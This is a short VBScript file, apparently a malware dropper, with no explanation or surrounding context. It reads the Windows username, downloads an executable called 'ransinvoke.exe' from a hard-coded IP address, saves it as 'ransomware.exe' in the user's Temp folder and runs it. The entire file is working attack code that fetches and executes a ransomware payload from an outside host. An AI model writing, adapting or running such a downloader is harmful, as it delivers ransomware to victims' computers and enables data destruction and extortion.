Set wshShell = CreateObject( "WScript.Shell" )
strUserName = wshShell.ExpandEnvironmentStrings( "%USERNAME%" )
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://18.185.124.52/ransinvoke.exe", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\"& strUserName &"\AppData\Local\Temp\ransomware.exe", 2 '//overwrite
end with
Set objShell = Wscript.CreateObject("Wscript.Shell")
objShell.run("C:\Users\"& strUserName &"\AppData\Local\Temp\ransomware.exe")